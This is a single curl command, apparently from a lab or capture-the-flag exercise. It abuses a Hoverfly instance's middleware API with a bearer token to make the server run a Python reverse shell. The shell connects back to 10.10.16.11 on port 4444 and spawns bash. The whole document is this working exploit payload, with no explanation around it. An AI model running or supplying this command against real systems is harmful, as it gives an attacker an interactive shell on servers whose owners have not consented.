curl -X PUT http://10.129.128.3:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU3OTQ4MzcsImlhdCI6MTc3NDc1NDgzNywic3ViIjoiIiwidXNlcm5hXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAjX1EbRsQw9yvxfArf0rLf4WytdixBgEOI-YwBhNUojw" \
  -H "Content-Type: application/json" \
  -d '{"binary":"python3", "script":"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.11\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"}'